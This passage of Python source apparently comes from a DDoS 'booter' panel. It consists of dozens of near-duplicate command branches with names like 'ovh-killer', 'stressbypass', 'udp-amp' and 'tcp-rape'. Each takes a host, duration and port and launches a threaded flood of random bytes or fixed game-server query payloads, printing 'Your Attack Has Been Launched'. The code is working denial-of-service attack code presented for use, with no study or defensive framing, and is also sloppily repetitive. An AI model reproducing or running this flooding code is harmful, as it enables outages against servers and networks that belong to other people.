					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpslavv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpslavv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpslavv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-slav":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 658656
					drop = 658656
					bypass = 658656
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-drop":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpdrop":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10113443
					drop = 10112443
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-killer":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912886
					drop = 912886
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-amp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1660087
					drop = 1660087
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-kill":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 166611
					drop = 166611
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkillv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkillv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-amp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10222331
					drop = 10222331
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhampv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhampv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhampv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-rape":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912545
					drop = 912545
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprapev1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprapev2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprapev3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stress":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912333
					drop = 912333
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stressbypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 112441332
					drop = 112441332
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stress-bypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 112221334
					drop = 112221334
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stressdown":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stressrape":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "mem":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ntp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ard":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "pps":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "head":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "slow":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhbypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-bypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpbypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 110666771
					drop = 110665771
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-bypass":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "bomb":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 100246
					drop = 100246
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tor":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65507
					drop = 65507
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhrape":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhrapev1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhrapev2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhrapev3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-amp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912442
					drop = 912442
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ntp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65507
					drop = 65507
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-amp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 913989
					drop = 913398
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-reflect":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 512334
					drop = 512334
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmp-amp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10224331
					drop = 10224331
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-abuse":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912454
					drop = 912454
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
